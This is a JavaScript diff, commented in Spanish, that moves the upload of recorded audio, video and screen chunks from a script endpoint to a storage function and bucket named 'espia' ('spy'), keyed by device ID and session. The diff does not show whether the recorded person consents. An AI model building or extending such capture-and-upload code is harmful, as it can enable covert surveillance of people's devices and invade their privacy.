@@ -2415,15 +2415,10 @@ const Session = (() => {
         try {
           const b64 = await _audioBlobToBase64WH(evt.data);
           const idx = _audioChunkIdx++;
-          await fetch(mosUrl, {
-            method: 'POST',
-            body: JSON.stringify({
-              action: 'subirChunkAudio',
-              idSesion: _audioSesionId,
-              idx: idx,
-              audioBase64: b64,
-              mimeType: mimeType
-            })
+          // [cero-GAS F4] audio chunk → Edge `espia-chunk` (Storage) vía el helper unificado.
+          await _espiaCliWHPost('subirChunkAudio', {
+            idSesion: _audioSesionId, deviceId: window.WH_CONFIG?.deviceId || 'unknown',
+            tipo: 'audio', idx: idx, audioBase64: b64, mimeType: mimeType
           });
         } catch(e) { console.warn('[Audio WH] chunk falló:', e?.message); }
       };
@@ -2571,6 +2566,20 @@ const Session = (() => {
         espiaCerrarSesion: 'espia_cerrar_sesion'
       };
       async function _espiaCliWHPost(accion, params) {
+        // [cero-GAS F4] Chunk de media (audio/video/screen) → Edge `espia-chunk` (Storage bucket espia). Antes GAS.
+        if (accion === 'espiaSubirChunk' || accion === 'subirChunkAudio') {
+          try {
+            if (typeof API === 'undefined' || typeof API.espiaSubirChunkEdge !== 'function') return { ok: false };
+            const pp = params || {};
+            const tipo = pp.tipo || 'audio';
+            return await API.espiaSubirChunkEdge({
+              deviceId: pp.deviceId || window.WH_CONFIG?.deviceId || 'unknown', tipo,
+              ts: pp.ts || Date.now(), idx: pp.idx || 0,
+              base64: pp.contenido || pp.audioBase64 || '', mime: pp.mimeType || (tipo === 'audio' ? 'audio/webm' : 'video/webm'),
+              idSesion: pp.sesionId || pp.idSesion || (window._espiaCliWH && window._espiaCliWH.sesionId) || ''
+            });
+          } catch (_) { return { ok: false }; }
+        }
         // Supabase-first: si la acción tiene RPC y el directo está habilitado, va a mos.espia_* (mismo shape {ok,data}).
         const rpc = _ESPIA_RPC[accion];
         if (rpc && window.ESPIA_DIRECTO !== false && typeof API !== 'undefined' && API.espiaRpc) {
